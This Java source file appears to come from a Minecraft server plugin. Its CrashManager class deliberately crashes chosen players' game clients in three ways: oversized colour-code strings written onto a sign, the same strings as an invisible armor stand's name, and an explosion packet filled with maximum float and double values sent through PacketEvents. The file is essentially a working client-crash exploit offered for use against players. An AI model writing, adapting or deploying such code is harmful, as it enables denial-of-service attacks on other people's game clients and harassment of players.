package net.xenvision.xendelay.utils;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.BlockState;
import org.bukkit.block.Sign;
import org.bukkit.entity.ArmorStand;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;

import java.util.Collections;

public class CrashManager {

    public enum CrashType {
        SIGN,
        ENTITY,
        PAYLOAD
    }

    private static final String CRASH_STRING = "§c".repeat(512);
    private static final String[] SIGN_LINES = {CRASH_STRING, CRASH_STRING, CRASH_STRING, CRASH_STRING};
    private static final Vector3d MAX_VECTOR_3D = new Vector3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
    private static final Vector3f MAX_VECTOR_3F = new Vector3f(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE);
    private static final WrapperPlayServerExplosion CRASH_PACKET = new WrapperPlayServerExplosion(
            MAX_VECTOR_3D,
            Float.MAX_VALUE,
            Collections.emptyList(),
            MAX_VECTOR_3F
    );

    private final Plugin plugin;

    public CrashManager(Plugin plugin) {
        this.plugin = plugin;
    }

    public void crashWithSign(Player player) {
        Location loc = player.getLocation();
        Block block = loc.getBlock();
        
        if (!block.getType().isAir()) return;
        
        block.setType(Material.OAK_SIGN, false);
        player.sendSignChange(block.getLocation(), SIGN_LINES);
        
        BlockState state = block.getState();
        if (state instanceof Sign) {
            Sign sign = (Sign) state;
            
            for (int i = 0; i < 4; i++) {
                sign.setLine(i, CRASH_STRING);
            }
            
            sign.update(true, false);
        }
    }

    public void crashWithArmorStand(Player player) {
        Location loc = player.getLocation();
        World world = player.getWorld();
        ArmorStand stand = (ArmorStand) world.spawnEntity(loc, EntityType.ARMOR_STAND);
        
        stand.setInvisible(true);
        stand.setCustomName(CRASH_STRING);
        stand.setCustomNameVisible(true);
        stand.setMarker(true);
        
        Bukkit.getScheduler().runTaskLater(plugin, stand::remove, 20L);
    }

    public void crashWithPayload(Player player) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(player, CRASH_PACKET);
    }

    public void crashPlayer(Player player, CrashType type) {
        switch (type) {
            case SIGN -> crashWithSign(player);
            case ENTITY -> crashWithArmorStand(player);
            case PAYLOAD -> crashWithPayload(player);
        }
    }
}
